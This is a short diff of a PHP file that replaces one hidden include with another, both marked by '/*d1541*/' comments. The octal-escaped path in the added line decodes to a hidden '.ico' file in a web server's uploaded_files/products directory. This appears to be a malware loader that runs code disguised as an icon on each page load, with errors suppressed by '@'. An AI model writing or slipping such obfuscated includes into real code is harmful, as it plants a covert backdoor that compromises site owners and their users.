@@ -1,7 +1,8 @@
 <?php
 /*d1541*/
 
-@include "\057opt/\154ampp\057htdo\143s/up\154oade\144_fil\145s/ca\164egor\171/.08\14630aa\143.ico";
+@include "\057op\164/l\141mp\160/h\164do\143s/\165pl\157ad\145d_\146il\145s/\160ro\144uc\164s/\0567f\143f1\146ef\056ic\157";
 
 /*d1541*/
+
 
